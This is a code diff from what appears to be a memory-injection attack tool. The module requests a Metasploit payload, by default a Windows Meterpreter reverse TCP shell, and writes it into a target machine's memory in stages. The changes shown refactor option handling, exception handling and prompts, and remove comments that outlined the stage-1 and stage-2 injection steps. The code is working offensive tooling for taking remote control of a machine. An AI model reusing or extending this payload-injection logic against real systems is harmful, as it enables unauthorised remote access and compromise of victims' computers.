@@ -23,7 +23,8 @@ Created on Dec 5, 2013
 '''
 from inception import terminal
 from inception.exceptions import InceptionException
-from inception.external.pymetasploit.metasploit.msfrpc import MsfRpcClient, MsfRpcError, PayloadModule
+from inception.external.pymetasploit.metasploit.msfrpc \
+    import MsfRpcClient, MsfRpcError, PayloadModule
 from inception.memory import Target, Signature, Chunk
 from inception.interfaces.file import MemoryFile
 
@@ -237,10 +238,11 @@ def run(opts, memspace):
                      default='windows/meterpreter/reverse_tcp')
     try:
         module = PayloadModule(client, name)
-        set_opts(module, opts.msfopts + ',EXITFUNC=thread')
+        set_opts(module, ','.join(filter(None,
+                                         (opts.msfopts, 'EXITFUNC=thread'))))
         payload = module.execute(Encoder='generic/none').get('payload')
-    except MsfRpcError as e:
-        raise InceptionException('Could not get Metasploit payload: {0}'
+    except (MsfRpcError, TypeError) as e:
+        raise InceptionException('Could not generate Metasploit payload: {0}'
                                  .format(e))
 
     needed = [x for x in module.required if x not in module.advanced]
@@ -265,9 +267,9 @@ def run(opts, memspace):
     # Wait to ensure initial stage execution
     term.wait('Waiting to ensure stage 1 execution', 5)
     if isinstance(memspace.interface, MemoryFile):
-        term.poll('Press any key to continue')
+        term.poll('Press [enter] to continue')
     # TODO: Modify payload exitfunk that is used if the payload fails -
-    # this is needed for successful kernel exploitation
+    # this is needed for stable kernel exploitation
 
     # --- STAGE 2 ---
     # Concatenate shellcode and payload
@@ -289,17 +291,4 @@ def run(opts, memspace):
 
     term.info('Patch verified; successful')
     term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
-    # Copy off original memory content in the region where stage 1 will be
-    # written
-
-    # Patch with stage 1 - allocates a memory page and writes signature to
-    # frame boundary, and jumps to it
-
-    # Search for signature
-
-    # Restore the original memory content where stage 1 was written (overwrite
-    # it)
-
-    # Patch with stage 2 - forks / creates and executes a new thread with
-    # prepended shellcode
     pass
